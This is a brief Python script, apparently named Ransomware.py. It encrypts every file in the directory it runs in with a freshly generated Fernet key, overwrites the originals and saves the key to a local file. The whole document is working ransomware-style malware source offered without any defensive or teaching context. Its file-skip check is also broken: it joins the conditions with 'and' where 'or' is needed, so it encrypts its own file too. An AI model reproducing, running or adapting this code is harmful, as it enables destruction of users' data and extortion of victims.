import os
from cryptography.fernet import Fernet

file_list = []

for file in os.listdir():
    if file == "Ransomware.py" and file == "generate.key":
        continue
    if os.path.isfile(file):
        file_list.append(file)

key = Fernet.generate_key()

print(key)

with open("generate.key","wb") as generatedkey:
    generatedkey.write(key)

for file in file_list:
    with open(file,"rb") as the_file:
        contents = the_file.read()
    contents_encrypt = Fernet(key).encrypt(contents)
    with open(file,"wb") as the_file:
        the_file.write(contents_encrypt)